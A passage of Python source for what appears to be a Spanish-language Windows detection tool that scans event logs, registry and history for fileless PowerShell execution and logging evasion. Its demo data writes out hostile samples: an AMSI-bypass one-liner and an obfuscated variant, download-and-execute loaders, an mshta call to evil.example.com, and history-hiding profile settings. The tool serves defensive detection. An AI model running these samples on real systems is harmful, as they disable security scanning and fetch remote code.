                'PS v2 — uso detectado', tv,
                [('PowerShell v2 Downgrade (ejecución confirmada)', 'CRITICAL')],
                f'PowerShell v2 fue ejecutado el {tv}.\n{mv}\n\n'
                'PS v2 no tiene AMSI, no registra eventos 4104 ni 4103. '
                'Todo lo ejecutado bajo PS v2 es invisible para esta herramienta.',
                path='<Windows PowerShell log>', cat='bypass'))

    if feature_state == 'Enabled':
        findings.append(make_finding(
            'PS v2 — disponible', f'Comprobado: {now_str()}',
            [('PS v2 instalado y habilitado — bypass total disponible', 'HIGH')],
            'La feature MicrosoftWindowsPowerShellV2Root está HABILITADA.\n\n'
            'PS v2 evita AMSI, ScriptBlock Logging y Module Logging completamente.\n'
            'Recomendación: deshabilitar con:\n'
            '  Disable-WindowsOptionalFeature -Online '
            '-FeatureName MicrosoftWindowsPowerShellV2Root',
            path='<Windows Optional Features>', cat='bypass'))
    return findings


def scan_amsi_bypass() -> list:
    """AMSI desactivado por registro o bypass detectado en eventos."""
    cmd = r"""
foreach ($p in @('HKCU:\Software\Microsoft\Windows Script\Settings',
                  'HKLM:\Software\Microsoft\Windows Script\Settings')) {
    if (Test-Path $p) {
        $v=(Get-ItemProperty $p -EA SilentlyContinue).AmsiEnable
        if ($null -ne $v) { Write-Output "^TYPE:REG^PATH:$p^VAL:$v^END" }
    }
}
$provPath='HKLM:\SOFTWARE\Microsoft\AMSI\Providers'
if (Test-Path $provPath) {
    $count=(Get-ChildItem $provPath -EA SilentlyContinue).Count
    Write-Output "^TYPE:PROVIDERS^PATH:$provPath^VAL:$count^END"
}
"""
    raw, findings = run_ps(cmd, 20), []
    for block in raw.split('^END'):
        if '^TYPE:' not in block: continue
        try:
            typ  = block.split('^TYPE:')[1].split('^PATH:')[0].strip()
            path = block.split('^PATH:')[1].split('^VAL:')[0].strip()
            val  = block.split('^VAL:')[1].strip() if '^VAL:' in block else ''
        except IndexError: continue

        if typ == 'REG':
            try: amsi_val = int(val)
            except: amsi_val = -1
            if amsi_val == 0:
                findings.append(make_finding(
                    'AMSI — desactivado por registro', f'Comprobado: {now_str()}',
                    [('AMSI desactivado (AmsiEnable=0)', 'CRITICAL')],
                    f'AmsiEnable = 0 en {path}\n\n'
                    'AMSI está desactivado: el antivirus no puede escanear '
                    'scripts PowerShell ejecutados en esta sesión.',
                    path=path, cat='bypass'))

        elif typ == 'PROVIDERS':
            try: count = int(val)
            except: count = -1
            if count == 0:
                findings.append(make_finding(
                    'AMSI — sin providers registrados', f'Comprobado: {now_str()}',
                    [('Sin providers AMSI en registro (posible manipulación)', 'HIGH')],
                    f'No hay providers AMSI en {path}.\n'
                    'Esto puede indicar que alguien eliminó los providers para '
                    'deshabilitar AMSI sin modificar el valor AmsiEnable.',
                    path=path, cat='bypass'))
    return findings


def scan_ps7_config() -> list:
    """PS7 — comprueba si tiene ScriptBlock/Module Logging activos independientemente de PS5."""
    import json as _json
    findings = []
    ps7_bases = [
        Path(r'C:\Program Files\PowerShell\7'),
        Path(r'C:\Program Files\PowerShell\7-preview'),
    ]
    for base in ps7_bases:
        if not base.exists(): continue
        cfg_path = base / 'powershell.config.json'
        if not cfg_path.exists():
            findings.append(make_finding(
                'PS7 — sin powershell.config.json', f'Comprobado: {now_str()}',
                [('PS7 instalado sin configuración de logging independiente', 'HIGH')],
                f'PS7 está instalado en {base} pero no tiene powershell.config.json.\n\n'
                'Sin este archivo, ScriptBlock Logging NO está activo en PS7 '
                'aunque la GPO de PS5 lo exija. PS7 requiere configuración propia.',
                path=str(cfg_path), cat='bypass'))
            continue
        try:
            config = _json.loads(cfg_path.read_text(encoding='utf-8'))
        except Exception: continue
        hits = []
        if not config.get('ScriptBlockLogging', {}).get('EnableScriptBlockLogging', False):
            hits.append(('PS7 ScriptBlock Logging no activo', 'HIGH'))
        if not config.get('ModuleLogging', {}).get('EnableModuleLogging', False):
            hits.append(('PS7 Module Logging no activo', 'MEDIUM'))
        ep = config.get('Microsoft.PowerShell:ExecutionPolicy', '')
        if str(ep).lower() in ('bypass', 'unrestricted'):
            hits.append(('PS7 ExecutionPolicy Bypass en config', 'HIGH'))
        if hits:
            findings.append(make_finding(
                'PS7 — configuración de logging', f'Leído: {now_str()}',
                hits, _json.dumps(config, indent=2, ensure_ascii=False),
                path=str(cfg_path), cat='bypass'))
    return findings


def scan_4688_audit() -> list:
    """Comprueba si el evento 4688 captura la línea de comandos completa."""
    cmd = r"""
$key='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit'
$cmdLine=(Get-ItemProperty $key -EA SilentlyContinue).ProcessCreationIncludeCmdLine_Enabled
Write-Output "^CMDLINE:$cmdLine^END"
try {
    $pol=(auditpol.exe /get /subcategory:"Process Creation" 2>$null) -join ' '
    Write-Output "^AUDITPOL:$pol^END"
} catch { Write-Output "^AUDITPOL:ERROR^END" }
$sample=Get-WinEvent -LogName Security -MaxEvents 15 -EA SilentlyContinue |
    Where-Object { $_.Id -eq 4688 }
$hasCL=$false
foreach ($e in $sample) {
    $x=[xml]$e.ToXml(); $d=@{}
    foreach ($i in $x.Event.EventData.Data){$d[$i.Name]=$i.'#text'}
    if ($d['CommandLine'] -and $d['CommandLine'] -ne '-'){$hasCL=$true;break}
}
Write-Output "^HAS_CL:$hasCL^END"
"""
    raw = run_ps(cmd, 25)
    cmdline_en, auditpol, has_cl = None, '', None
    for block in raw.split('^END'):
        if '^CMDLINE:' in block:
            try: cmdline_en = block.split('^CMDLINE:')[1].strip()
            except: pass
        elif '^AUDITPOL:' in block:
            try: auditpol = block.split('^AUDITPOL:')[1].strip()
            except: pass
        elif '^HAS_CL:' in block:
            try: has_cl = block.split('^HAS_CL:')[1].strip()
            except: pass
    hits, lines = [], []
    if cmdline_en in (None, '', '0'):
        hits.append(('4688 sin captura de CommandLine (GPO no configurada)', 'HIGH'))
        lines.append('ProcessCreationIncludeCmdLine_Enabled: NO')
    else:
        lines.append(f'ProcessCreationIncludeCmdLine_Enabled: {cmdline_en}')
    if auditpol and 'no auditing' in auditpol.lower():
        hits.append(('Auditoría de creación de procesos desactivada', 'CRITICAL'))
    lines.append(f'Política auditpol: {auditpol or "(no disponible)"}')
    if has_cl == 'False':
        hits.append(('Eventos 4688 recientes sin campo CommandLine', 'HIGH'))
    if not hits: return []
    return [make_finding(
        'Auditoría: 4688 sin línea de comandos', f'Comprobado: {now_str()}',
        hits, '\n'.join(lines),
        path=r'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit',
        cat='bypass')]


def scan_wsl() -> list:
    """WSL — detecta si está instalado y si se ha usado como vector."""
    cmd = r"""
try {
    $f=Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -EA SilentlyContinue
    Write-Output "^WSL:$($f.State)^END"
} catch { Write-Output "^WSL:UNKNOWN^END" }
$wslDir="$env:LOCALAPPDATA\Packages"
if (Test-Path $wslDir) {
    Get-ChildItem $wslDir -EA SilentlyContinue |
        Where-Object { $_.Name -match 'Ubuntu|Debian|Kali|openSUSE|Alpine|Fedora|Oracle' } |
        ForEach-Object { Write-Output "^DISTRO:$($_.Name)^END" }
}
Get-WinEvent -LogName Security -MaxEvents 500 -EA SilentlyContinue |
    Where-Object { $_.Id -eq 4688 -and $_.Message -match 'wsl\.exe|ubuntu\.exe|bash\.exe|kali\.exe' } |
    ForEach-Object {
        $t=$_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
        $x=[xml]$_.ToXml(); $d=@{}
        foreach($i in $x.Event.EventData.Data){$d[$i.Name]=$i.'#text'}
        Write-Output "^USE:$t^CL:$($d['CommandLine'])^END"
    }
"""
    raw, findings = run_ps(cmd, 30), []
    wsl_state, distros = 'UNKNOWN', []
    for block in raw.split('^END'):
        if '^WSL:' in block:
            try: wsl_state = block.split('^WSL:')[1].strip()
            except: pass
        elif '^DISTRO:' in block:
            try: distros.append(block.split('^DISTRO:')[1].strip())
            except: pass
        elif '^USE:' in block:
            try:
                tv = block.split('^USE:')[1].split('^CL:')[0].strip()
                cl = block.split('^CL:')[1].strip() if '^CL:' in block else ''
            except IndexError: continue
            findings.append(make_finding(
                'WSL — uso detectado (4688)', tv,
                [('WSL usado como vector (evasión de logs PS)', 'HIGH')],
                f'WSL ejecutado el {tv}.\nComando: {cl or "(no capturado)"}',
                path='<Security 4688>', cat='bypass'))

    if wsl_state == 'Enabled' or distros:
        sev = 'HIGH' if distros else 'MEDIUM'
        findings.append(make_finding(
            'WSL — instalado', f'Comprobado: {now_str()}',
            [('WSL disponible como vector de evasión de logging', sev)],
            f'Estado feature WSL: {wsl_state}\n'
            f'Distribuciones encontradas: {", ".join(distros) or "ninguna"}\n\n'
            'Los comandos ejecutados dentro de WSL no aparecen en ningún '
            'log de Windows PowerShell ni en eventos 4104/4103.',
            path='<Windows Optional Features>', cat='bypass'))
    return findings

# ═══════════════════════════════════════════════════════════════════
#  REGISTRO DE ESCÁNERES
# ═══════════════════════════════════════════════════════════════════
#  Cada entrada: (nombre_interno, categoría, función)
#  cat='exec'   → evidencia de ejecución de comandos
#  cat='bypass' → intento de ocultación / bypass

SCANNERS = [
    # ── Evidencia de ejecución ─────────────────────────────────
    ('4104 ScriptBlock',   'exec',   scan_ps4104),
    ('4103 Module Log',    'exec',   scan_module_logging),
    ('4688 Procesos',      'exec',   scan_process_creation),
    ('Eventos PS',         'exec',   scan_ps_events),
    ('Historial + MRU',    'exec',   scan_cmd_history),
    ('Portapapeles',       'exec',   scan_clipboard_history),
    ('ISE / VSCode',       'exec',   scan_ise_history),
    # ── Detección de bypass / ocultación ───────────────────────
    ('$PROFILE',           'bypass', scan_profile_integrity),
    ('ConsoleHost',        'bypass', scan_history_integrity),
    ('Visor de eventos',   'bypass', scan_eventlog_integrity),
    ('PS v2 Downgrade',    'bypass', scan_psv2),
    ('AMSI Bypass',        'bypass', scan_amsi_bypass),
    ('PS7 Config',         'bypass', scan_ps7_config),
    ('Auditoría 4688',     'bypass', scan_4688_audit),
    ('WSL Vector',         'bypass', scan_wsl),
]

# ═══════════════════════════════════════════════════════════════════
#  EXPLICACIONES (panel de detalle)
# ═══════════════════════════════════════════════════════════════════
EXPLAIN = {
    'AMSI Bypass':                  'Intenta apagar o engañar a AMSI para ejecutar código sin ser detectado.',
    'Assembly Load (Fileless)':     'Carga programas .NET directamente en memoria, sin archivo en disco.',
    'Download GitHub':              'Descarga contenido desde GitHub, vía habitual para traer código externo.',
    'Download Web':                 'Descarga datos o scripts de internet.',
    'Fileless Execution':           'Ejecuta código cargado en memoria mediante invocación dinámica.',
    'Base64 Payload':               'Contiene datos codificados en Base64, usados para esconder comandos.',
    'LOLBin Abuse':                 'Usa herramientas legítimas de Windows para ejecutar código malicioso.',
    'Compression / Encoding':       'Descomprime o decodifica datos en memoria (carga oculta).',
    'Credential Access':            'Referencias a robo o manejo de credenciales.',
    'Shellcode / Injection':        'Inyección de código en procesos: señal fuerte de ejecución en memoria.',
    'Network C2':                   'Conexión con infraestructura de comando y control remoto (C2).',
    'ETW Patching':                 'Intenta parchear ETW para que Windows deje de registrar eventos.',
    'Invoke-Expression':            'iex / Invoke-Expression: ejecuta strings como código, base del fileless.',
    'Tick Escaping':                'Backtick (`) entre letras para disfrazar comandos ante firmas.',
    'String Concat Obf':            'Une fragmentos de texto para evitar detección por string completo.',
    'Char Obfuscation':             'Construye texto a partir de códigos de carácter ([char]0x50...).',
    'Caret Escaping (CMD)':         'Usa ^ en CMD para partir comandos y evadir firmas.',
    'Env Variable Abuse':           'Referencia a programas mediante variables de entorno ($env:comspec).',
    'Reverse String':               'Invierte el texto de un comando para ocultarlo.',
    'Replace Obfuscation':          'Reconstruye comandos mediante reemplazos de cadenas.',
    'Suspicious Long Base64':       'Bloque Base64 largo (>200 chars) — probable payload.',
    'Encoded PS Launch (E400)':     'PowerShell inició con comando codificado en Base64.',
    'Encoded PS Launch':            'PowerShell inició con -EncodedCommand.',
    'Historial desactivado (SaveNothing)': 'El perfil fuerza SaveNothing: ningún comando queda guardado.',
    'Manejador de historial personalizado': 'Filtro activo que decide qué comandos se excluyen del historial.',
    'Eliminación de PSReadLine':    'Descarga el módulo que gestiona el historial de consola.',
    'Borrado manual de historial':  'Borra el historial de sesión o el archivo de historial.',
    'Detención de transcripción':   'Detiene la grabación de transcripción de sesión.',
    'Borrado del log de eventos':   'Vacía canales del Visor de Eventos — elimina evidencia.',
    'Reducción de tamaño de log':   'Reduce el tamaño máximo del log para acelerar la rotación y perder eventos.',
    'Desactivación de ScriptBlock Logging': 'Desactiva el registro de bloques de script por GPO.',
    'Bypass de política de ejecución': 'Cambia la política a Bypass/Unrestricted.',
    'PS v2 Downgrade (en perfil)':  'El perfil fuerza uso de PS v2, que no tiene AMSI ni ScriptBlock Logging.',
    'AMSI Bypass (en script)':      'El script contiene patrones típicos de bypass de AMSI.',
    'ETW Bypass':                   'El script intenta deshabilitar el rastreo de eventos de Windows (ETW).',
    'Flags de ejecución oculta':    '-WindowStyle Hidden o -NonInteractive -NoProfile en lanzamiento.',
    'WSL como vector':              'Usa WSL/Bash para ejecutar comandos que no dejan rastro en logs PS.',
    'Ejecución oculta (-WindowStyle Hidden)': 'Proceso lanzado con ventana oculta — ejecución encubierta.',
    'Comando codificado en Base64': '-EncodedCommand en línea de lanzamiento de PowerShell.',
    'PS v2 Downgrade detectado en proceso': 'El proceso fue lanzado con -version 2 (sin AMSI/logging).',
    'Lanzamiento no interactivo y sin perfil': '-NonInteractive -NoProfile combinados — no deja historial.',
    '4688 sin CommandLine (auditoría incompleta)': 'El 4688 existe pero sin campo CommandLine: no se captura qué se ejecutó.',
    'Guardado de historial desactivado (SaveNothing en vivo)': 'La sesión actual tiene SaveNothing activo ahora mismo.',
    'AddToHistoryHandler activo — filtra comandos del historial': 'Hay un filtro activo (base del truco #password).',
    'Módulo PSReadLine no cargado': 'Sin PSReadLine no hay historial persistente en esta sesión.',
    'Archivo de historial inexistente': 'No existe ConsoleHost_history.txt pese a que PS se ha usado.',
    'Archivo de historial de solo lectura': 'El historial es de solo lectura: PS no puede añadir entradas.',
    'Archivo de historial vacío o casi vacío': 'El historial existe pero tiene menos de 10 bytes.',
    'Canal de log deshabilitado':   'Este canal de eventos está apagado: nada se escribe en él.',
    'Registro de eventos borrado (1102/104)': 'Alguien vació este registro manualmente.',
    'Auditoría del sistema modificada': 'La política de auditoría fue cambiada (evento 4719).',
    'Tamaño máximo de log reducido a menos del mínimo esperado': 'El log tiene un máximo muy pequeño — los eventos rotan y desaparecen rápido.',
    'Log casi vacío — posible borrado o rotación forzada': 'El log tiene menos de 1 KB a pesar de estar activo.',
    'Script Block Logging no configurado (SBL ausente)': 'Sin GPO de SBL el 4104 no registra contenido de scripts.',
    'Script Block Logging desactivado por política GPO': 'La GPO existe pero está explícitamente a 0.',
    'Module Logging (4103) no activo': 'El 4103 no registra cmdlets sin Module Logging activado.',
    'PS v2 instalado y habilitado — bypass total disponible': 'PS v2 da evasión completa de AMSI y ScriptBlock Logging.',
    'PowerShell v2 Downgrade (ejecución confirmada)': 'PS v2 fue realmente ejecutado — todo lo que hizo es invisible.',
    'AMSI desactivado (AmsiEnable=0)': 'AMSI está desactivado en registro: AV no escanea scripts PS.',
    'Sin providers AMSI en registro (posible manipulación)': 'No hay providers AMSI registrados — posible eliminación deliberada.',
    'PS7 instalado sin configuración de logging independiente': 'PS7 instalado sin powershell.config.json: sin logging propio.',
    'PS7 ScriptBlock Logging no activo': 'PS7 no registra bloques de script aunque PS5 sí lo haga.',
    'PS7 Module Logging no activo': 'PS7 no registra cmdlets.',
    'PS7 ExecutionPolicy Bypass en config': 'PS7 configurado con política Bypass/Unrestricted.',
    '4688 sin captura de CommandLine (GPO no configurada)': 'Los procesos se registran pero sin qué comando ejecutaron.',
    'Auditoría de creación de procesos desactivada': 'No se generan eventos 4688 en absoluto.',
    'Eventos 4688 recientes sin campo CommandLine': 'Los 4688 más recientes no tienen CommandLine capturado.',
    'WSL disponible como vector de evasión de logging': 'WSL está instalado: puede usarse para ejecutar sin dejar rastro en PS logs.',
    'WSL usado como vector (evasión de logs PS)': 'WSL fue ejecutado — los comandos Linux no aparecen en logs de PS.',
    'Historial de portapapeles vacío (posible borrado manual)': 'El historial Win+V estaba activo pero la carpeta está vacía.',
}

# ═══════════════════════════════════════════════════════════════════
#  DATOS DE DEMOSTRACIÓN
# ═══════════════════════════════════════════════════════════════════
def demo_findings() -> list:
    out = []

    def add(src, tv, pairs, content, path='', fileless=False, cat='exec'):
        hits = [(n, s) for n, s in pairs]
        out.append(make_finding(src, tv, hits, content, path, fileless, cat))

    # ── Evidencia de ejecución ──────────────────────────────────
    add('PS Event 4104', '2026-10-24 10:41:07', [
        ('AMSI Bypass', 'CRITICAL'), ('Fileless Execution', 'CRITICAL')],
        "[Ref.Assembly].GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        '<fileless>', True)

    add('PS Event 4104', '2026-10-24 10:41:09', [
        ('Assembly Load (Fileless)', 'CRITICAL'), ('Download Web', 'HIGH')],
        "$b=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/user/repo/main/x.bin');"
        "$a=[System.Reflection.Assembly]::Load($b);$a.EntryPoint.Invoke($null,@())",
        '<fileless>', True)

    add('PS Event 4103 (Module Log)', '2026-10-24 10:42:01', [
        ('Invoke-Expression', 'HIGH'), ('Download Web', 'HIGH')],
        "CommandInvocation(Invoke-WebRequest) | CommandInvocation(Invoke-Expression) | "
        "ParameterBinding: Uri=https://pastebin.com/raw/abc123",
        '<Microsoft-Windows-PowerShell/Operational>')

    add('Proceso 4688 (powershell.exe)', '2026-10-24 10:38:55', [
        ('Encoded PS Launch', 'HIGH'), ('Ejecución oculta (-WindowStyle Hidden)', 'HIGH')],
        'Proceso: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n'
        'Argumentos: powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand SQBFAFgA...',
        r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe')

    add('Proceso 4688 (powershell.exe)', '2026-10-24 09:15:00', [
        ('PS v2 Downgrade detectado en proceso', 'CRITICAL')],
        'Proceso: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n'
        'Argumentos: powershell.exe -version 2 -Command "Get-Process"',
        r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe')

    add('Proceso 4688 (mshta.exe)', '2026-10-24 10:30:12', [
        ('LOLBin Abuse', 'MEDIUM'), ('Network C2', 'HIGH')],
        'Proceso: C:\\Windows\\System32\\mshta.exe\n'
        'Argumentos: mshta.exe http://evil.example.com/payload.hta',
        r'C:\Windows\System32\mshta.exe')

    add('Historial PS (ConsoleHost)', '', [
        ('Invoke-Expression', 'HIGH'), ('Download Web', 'HIGH')],
        "iex ((New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abcd1234'))",
        r'C:\Users\demo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')

    add('Run MRU (Win+R)', '', [('LOLBin Abuse', 'MEDIUM')],
        'cmd /c certutil -urlcache -f http://example.com/a.exe %temp%\\a.exe',
        '<HKCU\\...\\RunMRU>')

    add('Portapapeles (actual)', f'Escaneado: 2026-10-24 10:45:00', [
        ('Shellcode / Injection', 'CRITICAL')],
        "$p=[Runtime.InteropServices.Marshal]; VirtualAlloc; WriteProcessMemory; CreateRemoteThread",
        '<clipboard>', True)

    add('TextInputHost', '2026-10-24 09:58:20', [
        ('Download GitHub', 'HIGH'), ('Tick Escaping', 'HIGH')],
        "i`e`x (iwr https://raw.githubusercontent.com/user/repo/main/run.ps1)",
        '<TextInput log>', True)

    add('ISE/VSCode Historial (Visual Studio Code Host_history.txt)', '', [
        ('AMSI Bypass', 'CRITICAL'), ('ETW Bypass', 'CRITICAL')],
        "[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType("
        "'Sy'+'stem.Management.Automation.Am'+'siUtils').GetField("
        "'ams'+'iInitFailed','NonPublic,Static').GetValue($null), [Byte]$true)",
        r'C:\Users\demo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt')

    # ── Bypass / ocultación ─────────────────────────────────────
    add('$PROFILE (Microsoft.PowerShell_profile.ps1)', 'Leído: 2026-10-24 10:00:00', [
        ('Historial desactivado (SaveNothing)', 'CRITICAL'),
        ('Manejador de historial personalizado', 'HIGH')],
        "Set-PSReadLineOption -HistorySaveStyle SaveNothing\n"
        "Set-PSReadLineOption -AddToHistoryHandler { param($l) $l -notmatch 'password|invoke|iex' }",
        r'C:\Users\demo\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1',
        cat='bypass')

    add('Integridad: Historial (ConsoleHost)', 'Comprobado: 2026-10-24 10:00:05', [
        ('Guardado de historial desactivado (SaveNothing en vivo)', 'CRITICAL'),
        ('AddToHistoryHandler activo — filtra comandos del historial', 'CRITICAL')],
        'SaveStyle: SaveNothing\nHandler: True\nPSReadLine: True\n'
        'HistPath: C:\\Users\\demo\\AppData\\Roaming\\...\\ConsoleHost_history.txt\n'
        'Existe: True\nSizeBytes: 0',
        r'C:\Users\demo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',
        True, 'bypass')

    add('Visor de eventos (Security)', '2026-10-24 09:50:00', [
        ('Registro de eventos borrado (1102/104)', 'CRITICAL')],
        'El registro "Security" fue borrado el 2026-10-24 09:50:00.',
        '<Security>', cat='bypass')

    add('Visor de eventos (Windows PowerShell)', 'Comprobado: 2026-10-24 10:00:06', [
        ('Log casi vacío — posible borrado o rotación forzada', 'MEDIUM')],
        'Canal: Windows PowerShell\nHabilitado: True\n'
        'Tamaño máximo: 15.0 MB\nTamaño actual: 2.1 KB',
        '<Windows PowerShell log>', cat='bypass')

    add('Política GPO: ScriptBlock Logging', 'Comprobado: 2026-10-24 10:00:06', [
        ('Script Block Logging no configurado (SBL ausente)', 'MEDIUM')],
        'EnableScriptBlockLogging = SIN_CONFIGURAR\n\n'
        'Sin este valor en 1, el escáner 4104 no puede ver el contenido '
        'de lo que se ejecuta, independientemente del resto de controles.',
        r'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging',
        cat='bypass')

    add('PS v2 — disponible', 'Comprobado: 2026-10-24 10:00:08', [
        ('PS v2 instalado y habilitado — bypass total disponible', 'HIGH')],
        'MicrosoftWindowsPowerShellV2Root: Enabled\n\n'
        'PS v2 evita AMSI, ScriptBlock Logging y Module Logging completamente.',
        '<Windows Optional Features>', cat='bypass')

    add('AMSI — desactivado por registro', 'Comprobado: 2026-10-24 10:00:09', [
        ('AMSI desactivado (AmsiEnable=0)', 'CRITICAL')],
        'AmsiEnable = 0 en HKCU:\\Software\\Microsoft\\Windows Script\\Settings\n\n'
        'AMSI está desactivado: el AV no puede escanear scripts PowerShell.',
        r'HKCU:\Software\Microsoft\Windows Script\Settings', cat='bypass')

    add('PS7 — sin powershell.config.json', 'Comprobado: 2026-10-24 10:00:10', [
        ('PS7 instalado sin configuración de logging independiente', 'HIGH')],
        'PS7 instalado en C:\\Program Files\\PowerShell\\7\\ pero sin powershell.config.json.\n'
        'ScriptBlock Logging NO activo en PS7 aunque la GPO de PS5 lo exija.',
        r'C:\Program Files\PowerShell\7\powershell.config.json', cat='bypass')

    add('Auditoría: 4688 sin línea de comandos', 'Comprobado: 2026-10-24 10:00:11', [
        ('4688 sin captura de CommandLine (GPO no configurada)', 'HIGH'),
        ('Eventos 4688 recientes sin campo CommandLine', 'HIGH')],
        'ProcessCreationIncludeCmdLine_Enabled: NO\n'
        'Eventos 4688 recientes: sin CommandLine capturado.\n\n'
        'Los procesos creados se registran pero sin qué comando ejecutaron.',
        r'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit', cat='bypass')

    add('WSL — instalado', 'Comprobado: 2026-10-24 10:00:12', [
        ('WSL disponible como vector de evasión de logging', 'HIGH')],
        'Estado feature WSL: Enabled\nDistribuciones: Ubuntu-22.04\n\n'
        'Los comandos dentro de WSL no aparecen en logs de Windows PowerShell.',
        '<Windows Optional Features>', cat='bypass')

    return out

# ═══════════════════════════════════════════════════════════════════
#  EXPORTACIÓN HTML / CSV / JSON
# ═══════════════════════════════════════════════════════════════════
_REPORT_CSS = """
body{background:#0a0c12;color:#e8ebf4;font:14px 'Segoe UI',sans-serif;margin:0;padding:32px}
h1{margin:0 0 4px;font-size:22px}.sub{color:#8189a3;margin-bottom:20px}
.cards{display:flex;gap:10px;margin-bottom:20px}
.card{flex:1;background:#141824;border:1px solid #252b3d;border-radius:10px;padding:12px 16px}
.card b{display:block;font-size:28px}.card span{color:#8189a3;font-size:11px}
.sec{color:#8189a3;font-size:12px;font-weight:700;margin:18px 0 6px;text-transform:uppercase;letter-spacing:.08em}
details{background:#0f121a;border:1px solid #252b3d;border-radius:8px;margin:6px 0;padding:8px 12px}
summary{cursor:pointer;display:flex;gap:8px;align-items:center;list-style:none}
.chip{border-radius:5px;padding:2px 8px;font-weight:700;font-size:11px;color:#0a0c12}
.meta{color:#8189a3;font-size:11px;margin:5px 0}
.ex{color:#8189a3;font-size:12px;margin:3px 0 3px 16px}
pre{background:#0a0c12;border-radius:6px;padding:10px;overflow:auto;
    white-space:pre-wrap;word-break:break-all;font:11px Consolas,monospace;max-height:300px}
"""
SEV_COL_HEX = {'CRITICAL':'#ff4d6a','HIGH':'#ff9a3c','MEDIUM':'#ffd23f','LOW':'#35d07f'}
SEV_ES      = {'CRITICAL':'Crítico','HIGH':'Alto','MEDIUM':'Medio','LOW':'Bajo'}
CAT_ES      = {'exec':'Evidencia de ejecución','bypass':'Bypass / Ocultación'}

def export_report(path: str, findings: list, admin: bool, secs: float):
    ext = Path(path).suffix.lower()
    clean = [{k:v for k,v in f.items() if not k.startswith('_')} for f in findings]

    if ext == '.json':
        with open(path, 'w', encoding='utf-8') as fh:
            json.dump(clean, fh, ensure_ascii=False, indent=2)
        return

    if ext == '.csv':
        with open(path, 'w', encoding='utf-8-sig', newline='') as fh:
            w = csv.writer(fh)
            w.writerow(['Severidad','Categoría','Tiempo','Fuente','Fileless','Detecciones','Ruta','Contenido'])
            for f in clean:
                w.writerow([f['severity'], f.get('cat',''), f['time'], f['source'],
                            'Sí' if f['fileless'] else 'No',
                            ', '.join(h[0] for h in f['hits']), f['path'], f['content']])
        return

    counts = {s: sum(1 for f in clean if f['severity']==s) for s in SEV_COL_HEX}
    cards  = ''.join(
        f'<div class="card"><b style="color:{SEV_COL_HEX[s]}">{counts[s]}</b>'
        f'<span>{SEV_ES[s].upper()}</span></div>' for s in SEV_COL_HEX)

    # Agrupar por categoría
    cats = {'exec': [], 'bypass': []}
    for f in clean:
        cats.setdefault(f.get('cat','exec'), []).append(f)

    rows = ''
    for cat, label in [('exec','Evidencia de ejecución'), ('bypass','Bypass / Ocultación')]:
        group = cats.get(cat, [])
        if not group: continue
        rows += f'<div class="sec">{label}</div>'
        for f in group:
            col = SEV_COL_HEX.get(f['severity'], '#fff')
            fl  = ' ⚡ FILELESS' if f['fileless'] else ''
            exps = ''.join(
                f'<div class="ex">• <b>{html.escape(h[0])}</b>'
                f'{(" — " + html.escape(EXPLAIN[h[0]])) if h[0] in EXPLAIN else ""}</div>'
                for h in dict.fromkeys(tuple(h) for h in f['hits']))
            rows += (
                f'<details><summary>'
                f'<span class="chip" style="background:{col}">{SEV_ES.get(f["severity"],f["severity"]).upper()}</span>'
                f'<b>{html.escape(f["source"])}{fl}</b>'
                f'<span class="meta">{html.escape(f["time"])}</span></summary>'
                f'<div class="meta">{html.escape(f["path"])}</div>{exps}'
                f'<pre>{html.escape(f["content"])}</pre></details>')

    doc = (f'<!doctype html><html lang="es"><meta charset="utf-8">'
           f'<title>HateFileless — Informe</title><style>{_REPORT_CSS}</style>'
           f'<h1>◈ HateFileless v{VERSION} — Informe de análisis</h1>'
           f'<div class="sub">Generado {now_str()} · v{VERSION} · '
           f'{"Administrador" if admin else "Sin admin"} · {len(clean)} hallazgos · {secs:.1f}s</div>'
           f'<div class="cards">{cards}</div>'
           f'{rows or "<p>Sin hallazgos.</p>"}</html>')
    with open(path, 'w', encoding='utf-8') as fh:
        fh.write(doc)

# ═══════════════════════════════════════════════════════════════════
#  TEMA Y CONSTANTES DE UI
# ═══════════════════════════════════════════════════════════════════
C = {
    'bg': '#0a0c12', 'surface': '#0f121a', 'card': '#141824', 'card2': '#1b2030',
    'border': '#252b3d', 'text': '#e8ebf4', 'muted': '#8189a3', 'dim': '#4b5269',
    'acc': '#4d8dff', 'acc_h': '#3b78e6', 'sel': '#22345c',
    'warn_bg': '#2a2113', 'warn_bd': '#5c4415',
}
SEV_COL = {'CRITICAL': '#ff4d6a', 'HIGH': '#ff9a3c', 'MEDIUM': '#ffd23f', 'LOW': '#35d07f'}
SEV_ES  = {'CRITICAL': 'Crítico', 'HIGH': 'Alto', 'MEDIUM': 'Medio', 'LOW': 'Bajo'}
SEG_MAP = {'Todos': None, 'Crítico': 'CRITICAL', 'Alto': 'HIGH', 'Medio': 'MEDIUM', 'Bajo': 'LOW'}
CAT_MAP = {'Todo': None, 'Ejecución': 'exec', 'Bypass': 'bypass'}
ALL_SRC = 'Todas las fuentes'
FONT, MONO = 'Segoe UI', 'Consolas'

# Mensajes cíclicos durante el escaneo (sin revelar qué se escanea)
_STATUS_CYCLE = ['Escaneando…', 'Procesando…', 'Analizando…',
                 'Verificando…', 'Filtrando…', 'Recopilando…']

# ═══════════════════════════════════════════════════════════════════
#  UTILIDADES DE SISTEMA
# ═══════════════════════════════════════════════════════════════════
